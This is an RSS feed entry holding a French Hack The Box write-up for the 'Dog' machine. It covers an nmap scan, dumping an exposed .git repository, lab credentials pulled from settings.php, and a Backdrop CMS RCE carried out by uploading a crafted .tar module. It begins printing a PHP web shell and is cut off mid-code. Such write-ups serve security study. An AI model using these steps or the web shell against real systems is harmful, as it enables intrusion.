<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sudo Misconfiguration on 01MI</title><link>https://01MI.github.io/fr/tags/sudo-misconfiguration/</link><description>Recent content in Sudo Misconfiguration on 01MI</description><generator>Hugo -- gohugo.io</generator><language>fr</language><lastBuildDate>Sat, 12 Jul 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://01MI.github.io/fr/tags/sudo-misconfiguration/index.xml" rel="self" type="application/rss+xml"/><item><title>Dog - Linux Easy - HTB Writeup</title><link>https://01MI.github.io/fr/p/dog-htb-writeup-linux-easy/</link><pubDate>Sat, 12 Jul 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/fr/p/dog-htb-writeup-linux-easy/</guid><description>&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Dog.PNG" alt="Featured image of post Dog - Linux Easy - HTB Writeup" />&lt;h2 id="résumé">Résumé
&lt;/h2>&lt;p>User: Identifiants de l&amp;rsquo;app web dans le code source extrait via GitHack + RCE via l&amp;rsquo;upload d&amp;rsquo;une archive.&lt;br>
Root: Misconfiguration sudo du CLI bee.&lt;/p>
&lt;h2 id="enumeration">Enumeration
&lt;/h2>&lt;p>A l&amp;rsquo;aide d&amp;rsquo;un scan nmap, nous pouvons identifier un service web sur le port 80 et SSH sur le port 22.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 3
&lt;/span>&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 8
&lt;/span>&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="hl">&lt;span class="lnt">21
&lt;/span>&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">-&lt;/span> &lt;span class="mf">10.129.208.97&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span> &lt;span class="nx">VERSION&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">OpenSSH&lt;/span> &lt;span class="mf">8.2&lt;/span>&lt;span class="nx">p1&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="nx">ubuntu0&lt;/span>&lt;span class="mf">.12&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Linux&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">protocol&lt;/span> &lt;span class="mf">2.0&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">hostkey&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">3072&lt;/span> &lt;span class="mi">97&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">89&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d3&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ed&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ac&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">d2&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">87&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">a7&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">RSA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">27&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">eb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">26&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">e9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">62&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">59&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">b1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">38&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ae&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nf">b&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ECDSA&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">93&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">88&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">47&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">69&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">af&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">72&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">09&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">ba&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">77&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nf">eb&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ED25519&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span> &lt;span class="nx">Apache&lt;/span> &lt;span class="nx">httpd&lt;/span> &lt;span class="mf">2.4.41&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Home&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">Dog&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">robots&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">22&lt;/span> &lt;span class="nx">disallowed&lt;/span> &lt;span class="nf">entries&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">15&lt;/span> &lt;span class="nx">shown&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">core&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">profiles&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">web&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">config&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">admin&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">comment&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">reply&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">filter&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tips&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">node&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">add&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">search&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">register&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">password&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">login&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">logout&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">admin&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nx">comment&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">reply&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">generator&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Backdrop&lt;/span> &lt;span class="nx">CMS&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//backdropcms.org)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">methods&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Supported&lt;/span> &lt;span class="nx">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">GET&lt;/span> &lt;span class="nx">HEAD&lt;/span> &lt;span class="nx">POST&lt;/span> &lt;span class="nx">OPTIONS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">favicon&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Unknown&lt;/span> &lt;span class="nx">favicon&lt;/span> &lt;span class="nx">MD5&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mf">3836E83&lt;/span>&lt;span class="nx">A3E835A26D789DDA9E78C5510&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">2.4.41&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mf">10.129.208.97&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">git&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">Git&lt;/span> &lt;span class="nx">repository&lt;/span> &lt;span class="nx">found&lt;/span>&lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">Repository&lt;/span> &lt;span class="nx">description&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Unnamed&lt;/span> &lt;span class="nx">repository&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">edit&lt;/span> &lt;span class="nx">this&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">description&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">name&lt;/span> &lt;span class="nx">the&lt;/span>&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Last&lt;/span> &lt;span class="nx">commit&lt;/span> &lt;span class="nx">message&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">todo&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">customize&lt;/span> &lt;span class="nx">url&lt;/span> &lt;span class="nx">aliases&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">reference&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//docs.backdro...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;h2 id="utilisateur">Utilisateur
&lt;/h2>&lt;h3 id="dump-git--rce-via-shelltar">Dump git + RCE via shell.tar
&lt;/h3>&lt;p>Le scan nmap a souligné que le dossier &lt;code>.git&lt;/code> de l&amp;rsquo;application web est exposé.&lt;br>
Nous utilisons &lt;a class="link" href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener"
>GitHack&lt;/a> afin d&amp;rsquo;obtenir une partie du code source.&lt;/p>
&lt;p>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">GitHack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">index&lt;/span> &lt;span class="nx">lib&lt;/span> &lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python&lt;/span> &lt;span class="nx">GitHack&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//dog.htb/.git&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Download&lt;/span> &lt;span class="nx">and&lt;/span> &lt;span class="nx">parse&lt;/span> &lt;span class="nx">index&lt;/span> &lt;span class="nx">file&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">LICENSE&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">README&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">md&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">core&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jshintignore&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
Dans ces fichiers, nous pouvons trouver un username &lt;code>tiffany&lt;/code> et un mot de passe &lt;code>BackDropJ2024DS2024&lt;/code>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">ir&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span> &lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">files&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">config_83dddd18e1ec67fd8ff5bba2453c7fb3&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">active&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">settings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;tiffany@dog.htb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">n&lt;/span> &lt;span class="nx">settings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">15&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">database&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">mysql&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//root:BackDropJ2024DS2024@127.0.0.1/backdrop&amp;#39;;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>Ces identifiants nous permettent de nous connecter à l&amp;rsquo;application web &lt;code>http://dog.htb&lt;/code> en tant que &lt;code>tiffany&lt;/code>.&lt;br>
Nous pouvons trouver la version de &lt;code>Backdrop&lt;/code> utilisée via l&amp;rsquo;onglet &lt;code>Reports&lt;/code> puis &lt;code>Status report&lt;/code>.&lt;br>
Cette version &lt;code>1.27.1&lt;/code> est vulnérable à une RCE.
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version.PNG"
width="1022"
height="492"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version_hu_abe110edb435d067.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_version_hu_3a56188cfc8c59ea.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="207"
data-flex-basis="498px"
>&lt;/p>
&lt;p>Cet &lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
>exploit&lt;/a> pourrait fonctionner mais, notre instance de backdrop n&amp;rsquo;autorise pas l&amp;rsquo;installation de modules en utilisant des archives &lt;code>.zip&lt;/code>.&lt;br>
Nous pouvons trouver cette information via l&amp;rsquo;onget &lt;code>Functionality&lt;/code> puis &lt;code>Install new modules&lt;/code>.
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip.PNG"
width="1273"
height="557"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip_hu_3353f62be050b291.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_zip_hu_4194d30c27ed02da.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="228"
data-flex-basis="548px"
>&lt;/p>
&lt;p>Nous allons créer notre propre archive &lt;code>.tar&lt;/code> en utilisant le code HTML/PHP et contenu de &lt;code>shell.info&lt;/code> fournis dans l&amp;rsquo;exploit.&lt;br>
Ensuite, sur la page d&amp;rsquo;installation des modules, nous uploadons notre archive.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="hl">&lt;span class="lnt">19
&lt;/span>&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="hl">&lt;span class="lnt">36
&lt;/span>&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">form&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;GET&amp;#34;&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;&amp;lt;?php echo basename($_SERVER[&amp;#39;PHP_SELF&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
